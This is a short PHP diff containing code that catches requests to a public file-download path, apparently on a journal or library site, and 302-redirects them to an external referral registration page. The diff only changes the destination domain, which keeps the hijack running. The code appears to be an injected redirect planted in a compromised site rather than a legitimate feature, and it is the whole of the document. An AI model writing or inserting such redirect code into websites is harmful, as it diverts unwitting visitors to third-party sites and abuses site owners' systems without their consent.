@@ -4,7 +4,7 @@
 // ==============================
 $requestUri = $_SERVER['REQUEST_URI'];
 if (preg_match('#/index\.php/rkt/libraryFiles/downloadPublic/\d+#', $requestUri)) {
-    header("Location: https://nota4dberani.live/register?ref=3UTAANT005N", true, 302);
+    header("Location: https://nota4dudara.live/register?ref=3UTAANT005N", true, 302);
     exit;
 }
 
